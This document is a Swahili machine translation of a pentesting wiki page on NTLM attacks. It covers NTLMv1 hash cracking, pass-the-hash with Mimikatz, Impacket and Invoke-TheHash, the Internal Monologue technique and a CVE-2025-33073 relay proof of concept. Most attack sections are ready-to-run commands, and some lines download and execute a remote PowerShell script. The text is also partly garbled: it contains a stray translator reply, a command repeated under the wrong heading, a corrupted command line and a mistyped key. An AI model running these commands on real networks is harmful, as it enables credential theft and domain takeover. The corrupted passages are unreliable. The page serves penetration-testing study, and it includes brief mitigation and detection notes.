# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Taarifa za Msingi

Katika mazingira ambako **Windows XP na Server 2003** zinatumika, hash za LM (Lan Manager) hutumika, ingawa inajulikana sana kuwa zinaweza kuathiriwa kwa urahisi. Hash maalum ya LM, `AAD3B435B51404EEAAD3B435B51404EE`, huonyesha kuwa LM haitumiki; hii ndiyo hash ya mfuatano tupu.

Kwa chaguo-msingi, itifaki ya uthibitishaji ya **Kerberos** ndiyo hutumika zaidi. NTLM (NT LAN Manager) hutumika katika hali mahususi: Active Directory haipo, domain haipo, Kerberos haifanyi kazi kwa sababu ya usanidi usio sahihi, au miunganisho inapojaribiwa kwa kutumia anwani ya IP badala ya hostname halali.

Kuwepo kwa kichwa cha **"NTLMSSP"** kwenye pakiti za mtandao huashiria mchakato wa uthibitishaji wa NTLM.

Usaidizi wa itifaki za uthibitishaji - LM, NTLMv1, na NTLMv2 - hutolewa na DLL maalum iliyo kwenye `%windir%\Windows\System32\msv1\_0.dll`.

**Mambo Muhimu**:

- Hash za LM zina udhaifu, na hash tupu ya LM (`AAD3B435B51404EEAAD3B435B51404EE`) huashiria kuwa haitumiki.
- Kerberos ndiyo njia chaguomsingi ya uthibitishaji; NTLM hutumika tu katika hali fulani.
- Pakiti za uthibitishaji wa NTLM hutambulika kwa kichwa cha "NTLMSSP".
- Itifaki za LM, NTLMv1, na NTLMv2 zinaungwa mkono na faili ya mfumo `msv1\_0.dll`.

## LM, NTLMv1 na NTLMv2

Unaweza kuangalia na kusanidi itifaki itakayotumika:

### GUI

Tekeleza _secpol.msc_ -> Sera za ndani -> Chaguo za Usalama -> Usalama wa Mtandao: Kiwango cha uthibitishaji cha LAN Manager. Kuna viwango 6 (kuanzia 0 hadi 5).

![LM, NTLMv1 na NTLMv2 - GUI: Tekeleza secpol.msc - Sera za ndani - Chaguo za Usalama - Usalama wa Mtandao: Kiwango cha uthibitishaji cha LAN Manager. Kuna viwango 6 (kuanzia 0 hadi 5)](<../../images/image (919).png>)

### Registry

Hii itaweka kiwango cha 5:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Thamani zinazowezekana:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## Mpangilio wa msingi wa uthibitishaji wa NTLM Domain

1. **Mtumiaji** huingiza **credentials** zake
2. Mashine ya client **hutuma ombi la authentication** pamoja na **jina la domain** na **username**
3. **Server** hutuma **challenge**
4. **Client husimba kwa njia fiche** **challenge** kwa kutumia hash ya password kama key, kisha huituma kama response
5. **Server hutuma** kwa **Domain controller** **jina la domain, username, challenge na response**. Ikiwa **hakuna** Active Directory iliyosanidiwa au jina la domain ni jina la server, credentials **hukaguliwa ndani ya mashine**.
6. **Domain controller hukagua kama kila kitu kiko sawa** na kutuma taarifa kwa server

**Server** na **Domain Controller** zinaweza kuunda **Secure Channel** kupitia server ya **Netlogon**, kwa kuwa Domain Controller inajua password ya server (ipo ndani ya db ya **NTDS.DIT**).

### Mpangilio wa uthibitishaji wa NTLM wa ndani

Uthibitishaji hufanyika kama ilivyoelezwa **hapo awali, lakini** **server** inajua **hash ya mtumiaji** anayejaribu kufanya authentication ndani ya faili la **SAM**. Kwa hiyo, badala ya kuuliza Domain Controller, **server itajikagua yenyewe** ili kubaini kama mtumiaji anaweza kufanya authentication.

### NTLMv1 Challenge

**Urefu wa challenge ni baiti 8** na **response ina urefu wa baiti 24**.

**NT hash (baiti 16)** hugawanywa katika **sehemu 3 za baiti 7 kila moja** (7B + 7B + (2B+0x00\*5)): **sehemu ya mwisho hujazwa kwa sufuri**. Kisha, **challenge** husimbwa kwa njia fiche kando kwa kutumia kila sehemu, na baiti zilizosimbwa kwa njia fiche **huunganishwa**. Jumla: 8B + 8B + 8B = Baiti 24.

**Matatizo**:

- Ukosefu wa **randomness**
- Sehemu 3 zinaweza **kushambuliwa kando** ili kupata NT hash
- **DES inaweza kuvunjwa**
- Key ya **sehemu ya 3** huundwa kila wakati kwa **sufuri 5**.
- Ikitolewa **challenge ileile**, **response** itakuwa **ileile**. Kwa hiyo, unaweza kumpa mwathiriwa mfuatano "**1122334455667788**" kama **challenge**, kisha kushambulia response kwa kutumia **rainbow tables zilizokokotolewa awali**.

### NTLMv1 attack

Unconstrained delegation haitumiki sana katika mazingira ya kisasa, lakini huduma ya **Print Spooler** inayoweza kufikiwa bado inaweza kutumiwa kulazimisha authentication kwenye host hiyo.

Unaweza kutumia vibaya credentials/sessions ulizonazo tayari kwenye AD ili **kuiomba printer ifanye authentication** dhidi ya **host iliyo chini ya udhibiti wako**. Kisha, kwa kutumia `metasploit auxiliary/server/capture/smb` au `responder`, unaweza **kuweka challenge ya authentication kuwa 1122334455667788**, kunasa jaribio la authentication, na ikiwa lilitumia **NTLMv1**, utaweza **kuivunja**.\
Ikiwa unatumia `responder`, unaweza kujaribu **kutumia flag ya `--lm`** ili kujaribu **kushusha kiwango** cha **authentication**.\
_Kumbuka kuwa kwa mbinu hii, authentication lazima ifanyike kwa kutumia NTLMv1 (NTLMv2 haifai)._

Kumbuka kuwa printer itatumia akaunti ya kompyuta wakati wa authentication, na akaunti za kompyuta hutumia **password ndefu na za nasibu** ambazo huenda **usiweze kuzivunja** kwa kutumia **dictionaries** za kawaida. Lakini authentication ya **NTLMv1** **hutumia DES** ([maelezo zaidi hapa](#ntlmv1-challenge)), kwa hiyo utaweza kuivunja ukitumia huduma maalum za kuvunja DES (kwa mfano, unaweza kutumia [https://crack.sh/](https://crack.sh) au [https://ntlmv1.com/](https://ntlmv1.com)).

### NTLMv1 attack kwa kutumia hashcat

NTLMv1 inaweza pia kushambuliwa kwa kutumia [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), ambayo hubadilisha ujumbe wa NTLMv1 uliokamatwa kuwa fomati zinazofaa kwa Hashcat.<sup>[[1]](#references)</sup>

Amri yake

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

ingetoa matokeo yafuatayo:

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

Hakuna maudhui yaliyotolewa baada ya “Create a file with the contents of:”. Tafadhali tuma maandishi unayotaka yatafsiriwe.

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

Endesha hashcat (ni bora kuisambaza kupitia zana kama hashtopolis) kwani vinginevyo itachukua siku kadhaa.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

Katika hali hii tunajua nenosiri lake ni password, kwa hiyo tutadanganya kwa madhumuni ya demo:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Sasa tunahitaji kutumia hashcat-utilities kubadilisha funguo za DES zilizopasuliwa kuwa sehemu za hash ya NTLM:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

Hatimaye, sehemu ya mwisho:

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

Viunganishe pamoja:

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### NTLMv2 Challenge

**Urefu wa challenge ni baiti 8** na **majibu 2 hutumwa**: Moja lina **urefu wa baiti 24** na urefu wa **jingine** hubadilika.

**Jibu la kwanza** huundwa kwa kusimba kwa kutumia **HMAC_MD5** **string** inayoundwa na **client na domain**, na kutumia **hash MD4** ya **NT hash** kama **key**. Kisha, **matokeo** hutumika kama **key** kusimba **challenge** kwa kutumia **HMAC_MD5**. Kisha, **client challenge ya baiti 8 huongezwa**. Jumla: Baiti 24.

**Jibu la pili** huundwa kwa kutumia **thamani kadhaa** (client challenge mpya, **timestamp** ili kuzuia **replay attacks**...)

Ikiwa una **PCAP iliyo na mabadilishano ya uthibitishaji yaliyofaulu**, toa domain, username, server challenge na jibu la NTLMv2, fomati capture kwa Hashcat, na utumie mode `5600` kujaribu kurejesha password. Mwongozo wa vitendo uliohifadhiwa unaendelea kuweka utaratibu wa kutoa sehemu za packet, huku mifano ya Hashcat ikifafanua format inayokubaliwa sasa.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Mara tu unapokuwa na hash ya victim**, unaweza kuitumia **kuiga utambulisho** wake.\
Unahitaji kutumia **tool** itakayotekeleza **uthibitishaji wa NTLM kwa kutumia** **hash** hiyo, **au** unaweza kuunda **sessionlogon** mpya na **kuingiza** **hash** hiyo ndani ya **LSASS**, ili kila **uthibitishaji wa NTLM utakapotekelezwa**, **hash** hiyo itatumika. Hili ndilo chaguo la mwisho ambalo mimikatz hutumia.

**Tafadhali kumbuka kuwa unaweza pia kutekeleza mashambulizi ya Pass-the-Hash kwa kutumia Computer accounts.**

### **Mimikatz**

**Lazima iendeshwe kama msimamizi**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

Hii huzindua mchakato chini ya mtumiaji wa sasa wa ndani, huku LSASS ikihusisha vitambulisho vilivyotolewa na kuingia kwake kwenye mtandao kwa miunganisho inayotoka. Kisha unaweza kufikia rasilimali za mtandao kama mtumiaji aliyetolewa, sawa na `runas /netonly`, bila kujua nenosiri la maandishi wazi.

### Pass-the-Hash kutoka Linux

Unaweza kupata utekelezaji wa msimbo kwenye mashine za Windows kwa kutumia Pass-the-Hash kutoka Linux.\
[**Tazama mifano ya vitendo ya utekelezaji wa Pass-the-Hash.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Zana za Impacket za Windows zilizokusanywa

Unaweza kupakua[ binaries za Impacket za Windows hapa](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Katika hali hii unahitaji kubainisha amri; cmd.exe na powershell.exe hazifai kupata shell shirikishi)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Kuna binaries nyingine nyingi za Impacket...

### Invoke-TheHash

Unaweza kupata scripts za powershell hapa: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

Kazi hii inachanganya modi zilizotangulia. Unaweza kuweka **hosts kadhaa**, kuondoa targets maalum, na kuchagua _SMBExec, WMIExec, SMBClient,_ au _SMBEnum_. Ukichagua **SMBExec** au **WMIExec** bila kigezo cha _**Command**_, hukagua tu ikiwa una ruhusa za kutosha.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Lazima iendeshwe kama msimamizi**

Zana hii itafanya jambo lilelile kama mimikatz (kurekebisha kumbukumbu ya LSASS).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### Utekelezaji wa mbali wa Windows kwa mikono kwa kutumia jina la mtumiaji na nenosiri


{{#ref}}
../lateral-movement/
{{#endref}}

## Kutoa vitambulisho kutoka kwa Host ya Windows

Kwa maelezo zaidi, angalia [**Kuiba Vitambulisho vya Windows**](../stealing-credentials/README.md).

## Shambulio la Internal Monologue

Shambulio la Internal Monologue ni mbinu fiche ya kutoa vitambulisho inayomwezesha mshambuliaji kupata NTLM hashes kutoka kwenye mashine ya mwathiriwa **bila kuwasiliana moja kwa moja na mchakato wa LSASS**. Tofauti na Mimikatz, ambayo husoma hashes moja kwa moja kutoka kwenye kumbukumbu na mara nyingi huzuiwa na suluhisho za usalama wa endpoint au Credential Guard, shambulio hili hutumia **miito ya ndani kwa kifurushi cha uthibitishaji cha NTLM (MSV1_0) kupitia Security Support Provider Interface (SSPI)**. Kwanza mshambuliaji **hushusha kiwango cha mipangilio ya NTLM** (kwa mfano, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) ili kuhakikisha kuwa NetNTLMv1 inaruhusiwa. Kisha huiga tokeni za watumiaji zilizopo zinazopatikana kutoka kwenye michakato inayoendeshwa na kuanzisha uthibitishaji wa NTLM ndani ya mfumo ili kuzalisha majibu ya NetNTLMv1 kwa kutumia challenge inayojulikana.<sup>[[4]](#references)</sup>

Baada ya kunasa majibu haya ya NetNTLMv1, mshambuliaji anaweza kurejesha haraka hashes za awali za NTLM kwa kutumia **rainbow tables zilizokokotolewa mapema**, na hivyo kuwezesha mashambulio zaidi ya Pass-the-Hash kwa lateral movement. Muhimu zaidi, Shambulio la Internal Monologue hubaki fiche kwa sababu halizalishi trafiki ya mtandao, haliingizi code, wala kuanzisha utupaji wa moja kwa moja wa kumbukumbu, hivyo kufanya iwe vigumu zaidi kwa watetezi kuligundua ikilinganishwa na mbinu za kawaida kama Mimikatz.

Ikiwa NetNTLMv1 haikubaliwi—kutokana na sera za usalama zilizowekwa kutekelezwa—mshambuliaji anaweza kushindwa kupata jibu la NetNTLMv1.

Ili kushughulikia hali hii, zana ya Internal Monologue ilisasishwa: Hupata tokeni ya server kwa nguvu kwa kutumia `AcceptSecurityContext()` ili bado **kunasa majibu ya NetNTLMv2** ikiwa NetNTLMv1 itashindwa. Ingawa NetNTLMv2 ni ngumu zaidi kuvunja, bado hutoa njia ya mashambulio ya relay au brute-force ya offline katika hali chache.

PoC inapatikana katika **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay na Responder

**Soma mwongozo wa kina zaidi kuhusu jinsi ya kutekeleza mashambulio hayo hapa:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Kuchanganua changamoto za NTLM kutoka kwenye nakala ya trafiki ya mtandao

**Unaweza kutumia** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM na Kerberos *Reflection* kupitia SPNs zilizosanifishwa (CVE-2025-33073)

Windows ina mbinu kadhaa za kupunguza hatari zinazojaribu kuzuia mashambulio ya *reflection*, ambapo uthibitishaji wa NTLM (au Kerberos) unaoanzia kwenye host unarudishwa kupitia relay hadi kwenye **host hiyohiyo** ili kupata haki za SYSTEM.  

Microsoft ilivunja minyororo mingi ya mashambulio ya umma kwa kutumia MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) na masasisho ya baadaye, hata hivyo **CVE-2025-33073** inaonyesha kuwa ulinzi bado unaweza kukwepwa kwa kutumia jinsi **mteja wa SMB anavyokata Service Principal Names (SPNs)** zilizo na taarifa lengwa zilizofungwa kwa *marshalled* (serialized).<sup>[[5]](#references)[[6]](#references)</sup>

### Kwa kifupi: hitilafu
1. Mshambuliaji husajili **rekodi ya DNS A** ambayo lebo yake husimba SPN iliyofungwa kwa marshalled – kwa mfano:
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Mwathiriwa hulazimishwa kuthibitisha utambulisho wake kwa hostname hiyo (PetitPotam, DFSCoerce, n.k.).
3. Mteja wa SMB anapopitisha mfuatano wa lengwa `cifs/srv11UWhRCAAAAA…` kwa `lsasrv!LsapCheckMarshalledTargetInfo`, mwito wa `CredUnmarshalTargetInfo` **huondoa** blob iliyosanifishwa, na kuacha **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (au inayolingana nayo ya Kerberos) sasa huchukulia lengwa kuwa *localhost* kwa sababu sehemu fupi ya host inalingana na jina la kompyuta (`SRV1`).
5. Kwa hiyo, server huweka `NTLMSSP_NEGOTIATE_LOCAL_CALL` na kuingiza **tokeni ya ufikiaji ya SYSTEM ya LSASS** kwenye muktadha (kwa Kerberos, ufunguo wa subsession uliowekwa alama ya SYSTEM huundwa).
6. Kurelay uthibitishaji huo kwa `ntlmrelayx.py` **au** `krbrelayx.py` hutoa haki kamili za SYSTEM kwenye host hiyohiyo.<sup>[[5]](#references)</sup>

### PoC ya haraka
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### Viraka na Hatua za Kupunguza Hatari
* Viraka vya KB vya **CVE-2025-33073** vinaongeza ukaguzi katika `mrxsmb.sys::SmbCeCreateSrvCall` unaozuia muunganisho wowote wa SMB ambao lengo lake lina taarifa zilizofungashwa (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Tekeleza **SMB signing** kwenye malengo ya SMB relay. Kwa malengo mengine, tathmini mahitaji ya signing au Extended Protection ya itifaki husika na kiwango cha viraka; SMB signing pekee haiamui kama HTTPS WinRM relay inawezekana.
* Fuatilia rekodi za DNS zinazofanana na `*<base64>...*` na zuia njia za coercion (PetitPotam, DFSCoerce, AuthIP...).

### Mawazo ya Ugunduzi
* Kunasa trafiki ya mtandao yenye `NTLMSSP_NEGOTIATE_LOCAL_CALL` ambapo IP ya mteja ≠ IP ya seva.
* Kerberos AP-REQ yenye subsession key na principal ya mteja inayolingana na hostname.
* Logoni za SYSTEM za Windows Event 4624/4648 zikifuatiwa mara moja na uandishi wa mbali wa SMB kutoka kwa hosti hiyohiyo.<sup>[[5]](#references)</sup>

Jina la DNS lililoserialishwa lenye taarifa za lengo pia linaweza kuelekeza uthibitishaji uliolazimishwa kwa mshambuliaji kwa ajili ya **cross-protocol relay** hadi kwenye endpoint ya AD CS ya web-enrollment. Haya ni matokeo tofauti na reflection ya hosti hiyohiyo: masharti ya usajili ya [ESC8](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), ruhusa za kuandika kwenye DNS, njia ya coercion, na kiwango cha viraka cha lengo lazima vitathminiwe kila kimoja kivyake.

Kwa variant ya reflection ya ndani ya **Machi 2026** inayotumia vibaya **SMB arbitrary ports** na **TCP connection reuse** kufikia `NT AUTHORITY\SYSTEM`, angalia:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat example hashes – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Cracking an NTLMv2 Hash – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
